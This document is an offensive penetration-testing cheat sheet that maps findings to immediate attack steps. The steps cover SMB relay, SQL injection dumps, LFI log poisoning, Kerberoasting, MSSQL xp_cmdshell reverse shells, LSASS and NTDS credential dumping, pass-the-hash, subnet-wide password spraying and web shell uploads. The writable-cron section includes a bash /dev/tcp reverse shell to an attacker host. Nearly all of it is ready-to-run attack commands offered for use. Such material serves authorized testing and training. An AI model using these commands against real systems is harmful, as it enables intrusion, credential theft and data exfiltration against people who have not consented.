# Finding-to-Action Matrix

## Purpose
Input: A specific finding. Output: Your exact next steps. No thinking required.

---

## SMB Signing Disabled

```
→ IMMEDIATE ACTION: SMB Relay setup
  1. Start responder: sudo responder -I tun0 -wrf
  2. Prepare relay: ntlmrelayx.py -tf targets.txt -smb2support
  3. If ADCS in targets: ntlmrelayx.py -t http://dc/certsrv -adcs -smb2support
  4. Trigger relay from compromised host or via coercing
  ⚠ DON'T: Run Responder on same network without disabling SMB server

→ IF DOMAIN CONTROLLER: ADCS relay → DA in 30 seconds
→ IF TARGET HAS ADMIN RIGHTS: psexec.py against relay target
```

## Writable SMB Share

```
→ IMMEDIATE ACTION: Determine accessibility
  ├── Web-accessible? → Upload web shell → RCE → Shell
  ├── Startup folder? → Upload .bat/.vbs → SYSTEM on reboot
  ├── SCF attack → hash capture via Responder
  ├── Write .lnk → hash capture via Responder
  └── Write config files → web app overwrite → RCE

→ PERSISTENCE: Upload scheduled task trigger
  ⚠ DON'T: Upload obvious malware (AV triggers)
```

## SQL Injection (Web)

```
→ IMMEDIATE ACTION: Confirm and extract
  1. sqlmap -u "http://target/page?id=1" --batch --banner
  2. sqlmap -u "http://target/page?id=1" --dbs --batch
  3. sqlmap -u "http://target/page?id=1" -D db --tables --batch
  4. sqlmap -u "http://target/page?id=1" -D db -T users --dump --batch

→ IF OS SHELL POSSIBLE:
  sqlmap -u "http://target/page?id=1" --os-shell

→ HASHES FOUND?
  ├── Crack with hashcat (identify type first)
  └── Reuse password on: SSH, RDP, web admin, SMB

→ DB CREDS FOUND?
  ├── Test on: SSH (same server), MySQL/MSSQL (network)
  └── Password reuse sweep: netexec sweep
```

## LFI (Local File Inclusion)

```
→ IMMEDIATE ACTION: Test file read and escalation
  ├── Read: /etc/passwd, /etc/shadow, /var/www/html/config.php
  ├── Read: ../../../etc/passwd (depth check)
  ├── Read: /proc/self/environ, /proc/self/cmdline
  ├── Read: php://filter/convert.base64-encode/resource=index.php
  └── Read: /etc/nginx/sites-enabled/default, web.config

→ IF PHP: php://filter + base64 decode → source code → creds
→ IF LOG POISONING: Write PHP shell to access log → include log → RCE
→ IF /proc/self/environ: Poison User-Agent → include → RCE
→ IF FILE UPLOAD + LFI: Upload image with PHP → include → RCE
  ⚠ DON'T: Only check /etc/passwd (need config files for creds)
```

## Kerberoastable User

```
→ IMMEDIATE ACTION: Request and crack
  1. impacket-GetUserSPNs domain.local/user:pass -dc-ip target -request -format hashcat
  2. hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

→ IF CRACKED:
  1. Test service account login on SMB/WinRM
  2. Check service account groups (often in high-priv groups)
  3. BloodHound the cracked service account

→ IF UNCRACKABLE:
  ├── Try weaker ruleset (small words, season patterns)
  ├── Try rockyou (full)
  └── Keep for later - may get another source
```

## AS-REP Roastable User

```
→ IMMEDIATE ACTION: Request and crack
  1. impacket-GetNPUsers domain.local/ -dc-ip target -usersfile users.txt -request -format hashcat
  2. hashcat -m 18200 hash.txt rockyou.txt -r rules/best64.rule

→ IF CRACKED:
  1. Domain user shell → BloodHound
  2. Kerberoast (now you have creds)
  3. Password spray (user may reuse)

→ IF NO CRACK:
  ├── Add to crack queue (lower priority)
  └── Move to password spray
```

## MSSQL Sysadmin (SA)

```
→ IMMEDIATE ACTION: Command execution
  1. Enable xp_cmdshell:
     EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
     EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  2. EXEC xp_cmdshell 'whoami'
  3. EXEC xp_cmdshell 'powershell -enc <revshell>'

→ POST-SHELL:
  1. Check MSSQL service account (often high-priv)
  2. Check linked servers → lateral movement
  3. xp_dirtree → hash capture if relay available

→ IF xp_cmdshell BLOCKED:
  ├── sp_OACreate bypass
  ├── MSSQL CLR assembly
  └── xp_regwrite to add startup
```

## Local Admin (Windows)

```
→ IMMEDIATE ACTION: Credential access
  1. LSASS dump: procdump.exe -ma lsass.exe lsass.dmp
  2. SAM dump: reg save HKLM\SAM...
  3. Mimikatz: sekurlsa::logonpasswords

→ LATERAL MOVEMENT:
  1. Check same password on ALL hosts (netexec sweep)
  2. PTH: psexec.py -hashes :hash user@other-host
  3. WinRM: evil-winrm -i other-host -u user -H hash

→ AD ENUMERATION:
  1. BloodHound from this position
  2. Check domain trust relationships
  3. Kerberoast with cached domain creds
```

## WinRM Access

```
→ IMMEDIATE ACTION: Verify privilege level
  1. evil-winrm -i target -u user -p pass
  2. whoami /priv → SeImpersonate? → PrintSpoofer → SYSTEM
  3. whoami /groups → Domain admin? → DCSync
  4. net localgroup administrators → Check if admin

→ POST-ACCESS (USER LEVEL):
  1. System info → OS/build/patches
  2. netstat -ano → connections
  3. ipconfig /all → interfaces
  4. BloodHound (upload SharHound.ps1)

→ POST-ACCESS (ADMIN LEVEL):
  1. LSASS dump
  2. Security event logs
  3. Domain admin session steal
```

## SSH Access

```
→ IMMEDIATE ACTION: Privilege escalation
  1. sudo -l → Sudo permissions
  2. id → Group membership
  3. linpeas.sh / linenum.sh
  4. Check SSH key reuse (other hosts)

→ LATERAL MOVEMENT:
  1. SSH key to other hosts: ssh user@other-host
  2. SSH tunnel: ssh -D 1080 attacker@target (SOCKS proxy)
  3. Check bash_history for creds

→ POST-ACCESS:
  1. /etc/passwd, /etc/shadow (if root)
  2. .ssh/authorized_keys (check all users)
  3. crontab, scheduled tasks
  4. Browser stored passwords
```

## BloodHound Path to DA

```
→ IMMEDIATE ACTION: Follow the path
  1. Find shortest path to Domain Admins
  2. Identify intermediate rights needed
  3. Execute each step: ACL abuse → group membership → DA

→ COMMON BLOODHOUND EDGES:
  ├── MemberOf → Add user to group
  ├── ForceChangePassword → Reset target's password
  ├── AllExtendedRights → DCSync / Reset password
  ├── GenericAll → Full control of target object
  ├── GenericWrite → Write to target's attributes
  ├── WriteDACL → Modify target's ACL → GenericAll
  ├── AddMember → Add user to group
  ├── HasSession → Token steal from user
  ├── AdminTo → Admin on target machine
  └── CanRDP → RDP access to target

→ EXECUTION TOOLS:
  ├── bloodyAD (ACL abuse)
  ├── Impacket (golden ticket, DCSync)
  ├── PowerView (PowerShell AD abuse)
  └── net rpc / Impacket (group management)
```

## GPP Password (Groups.xml)

```
→ IMMEDIATE ACTION: Decrypt and use
  1. gpp-decrypt "cpassword_base64"
  2. This is a PLAINTEXT domain credential
  3. Test: netexec smb target -u 'domain\user' -p 'decrypted_pass'
  4. Check if user is domain admin

→ POST-ACCESS:
  1. PSExec/SMBexec → Shell (if admin)
  2. BloodHound position
  3. SYSVOL replay (check other GPP files)
```

## LAPS Password

```
→ IMMEDIATE ACTION: Read and use
  1. netexec ldap target -u user -p pass -M laps
  2. OR: ldapsearch -b "dc=domain,dc=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
  3. Local admin password on target machine

→ POST-ACCESS:
  1. WinRM/SMB → Shell (use LAPS password)
  2. LSASS dump → Domain creds
  3. Check other machines with LAPS
```

## Backup File Found

```
→ IMMEDIATE ACTION: Classify and extract
  ├── Database (.sql, .bak):
    → grep: password, admin, user, hash, cred
    → Test extracted creds on all services
  
  ├── Application config (.config, .xml, .env):
    → Connection strings
    → API keys
    → Service account passwords
  
  ├── Registry (.reg, .hiv):
    → reg load, extract SAM/SYSTEM
    → secretsdump.py -sam -system
  
  ├── Windows (SAM, SYSTEM, NTDS.dit):
    → secretsdump.py -ntds ntds.dit -system system.hive LOCAL
    → All domain hashes

  └── Archive (.zip, .tar.gz, .7z):
    → Extract and search all files
    → grep -r: password, cred, secret, key, admin
```

## Web Admin Access Found

```
→ IMMEDIATE ACTION: Leverage for RCE
  ├── CMS Admin (WordPress/Joomla/Drupal):
    → Upload plugin/theme → PHP/RCE
    → Edit template → PHP/RCE
    → WP: Appearance → Editor → 404.php shell
  
  ├── Custom Admin Panel:
    → File upload module → Webshell
    → Command execution feature
    → Config editor → SSH key injection
  
  → Credential reuse → SSH/Email/Other services
```

## Writeable Cron Job (Linux)

```
→ IMMEDIATE ACTION: Hijack the cron
  1. See what runs and as who (root? other user?)
  2. If writable script: append rev shell
     echo 'bash -c "bash -i >& /dev/tcp/attacker/443 0>&1"' >> /path/to/script.sh
  3. If wildcard: --checkpoint=1 --checkpoint-action=exec=sh
  4. Wait or trigger cron manually

→ POST-ROOT:
  1. /etc/shadow → All hashes
  2. SSH keys → All users
  3. DB → All data
```

## Password Found (Any Source)

```
→ IMMEDIATE ACTION: Test everywhere
  1. CLASSIFY:
     ├── Domain? → BloodHound + Kerberoast + Spray more
     ├── Local? → Test on source host + ALL hosts
     └── Service? → Check SPN + test target host
  
  2. NETEXEC SWEEP (parallel):
     netexec smb <subnet>/24 -u user -p pass --continue-on-success
     netexec winrm <subnet>/24 -u user -p pass --continue-on-success
     netexec ssh <subnet>/24 -u user -p pass --continue-on-success
     netexec mssql <subnet>/24 -u user -p pass --continue-on-success

  3. WEB: Check all web admin panels with creds
```

## Hash Found (NTLM)

```
→ IMMEDIATE ACTION: PTH before cracking
  1. PTH immediately:
     psexec.py -hashes LMHASH:NTHASH user@target
     wmiexec.py -hashes :NTHASH user@target
     evil-winrm -i target -u user -H NTHASH

  2. Cracking in background (if needed):
     hashcat -m 1000 hash.txt rockyou.txt

  ⚠ DON'T: Crack NTLM before trying PTH (wastes time)
```

## Hash Found (NetNTLMv2)

```
→ IMMEDIATE ACTION: Crack or Relay
  1. Check SMB signing status on original target
  2. If signing disabled: RELAY immediately
     ntlmrelayx.py -tf targets.txt -smb2support
  
  3. If signing required: CRACK
     hashcat -m 5600 hash.txt rockyou.txt -r rules/best64.rule

  4. If relay target is ADCS: ntlmrelayx.py -t http://dc/certsrv -adcs
```

## Responder Capture

```
→ IMMEDIATE ACTION: Process hash
  1. Locate hash in /usr/share/responder/logs/
  2. Identify hash type:
     ├── NTLMv2 (hashcat mode 5600) → Crack or Relay
     └── NTLMv1 (hashcat mode 5500) → Crack (weaker)
  
  3. CHECK SMB SIGNING on requesting host
     ├── Signing off? → Relay (ntlmrelayx.py)
     └── Signing on? → Crack (hashcat)
```

## Open Admin Port (9100, 11211, etc.)

```
→ IMMEDIATE ACTION: Check default access
  ├── Printer (9100): Check network printing, rarely exploited
  ├── Memcached (11211): stats, get keys → data extraction
  ├── MongoDB (27017): Default no auth → all databases
  ├── CouchDB (5984): Default no auth → data
  ├── Elasticsearch (9200): GET / → indices → data
  └── Cassandra (9042, 9160): Default creds → data
```

## Quick Reference: Priority by Finding

| Finding | Priority | Time to Action |
|---------|----------|----------------|
| SMB Signing Disabled | CRITICAL | 5 min (relay setup) |
| Writable SMB Share | HIGH | 2 min (shell upload) |
| SQL Injection | CRITICAL | 5 min (data dump) |
| LFI | HIGH | 2 min (file read) |
| Kerberoastable User | MEDIUM | 30 min (crack) |
| AS-REP Roastable | HIGH | 30 min (crack) |
| MSSQL SA | CRITICAL | 1 min (xp_cmdshell) |
| Local Admin | CRITICAL | 5 min (LSASS dump) |
| WinRM Access | HIGH | Immediate shell |
| SSH Access | HIGH | Immediate shell |
| BloodHound DA Path | HIGH | 30 min (path follow) |
| GPP Password | CRITICAL | 1 min (decrypt + use) |
| LAPS Password | CRITICAL | 1 min (read + use) |
| Backup File | MEDIUM | 10 min (extract) |
| Responder Capture | HIGH | 5 min (crack/relay) |
| Password Found | HIGH | 5 min (test all) |
| NTLM Hash Found | HIGH | 2 min (PTH) |
| NetNTLMv2 Hash Found | MEDIUM | 30 min (crack) |
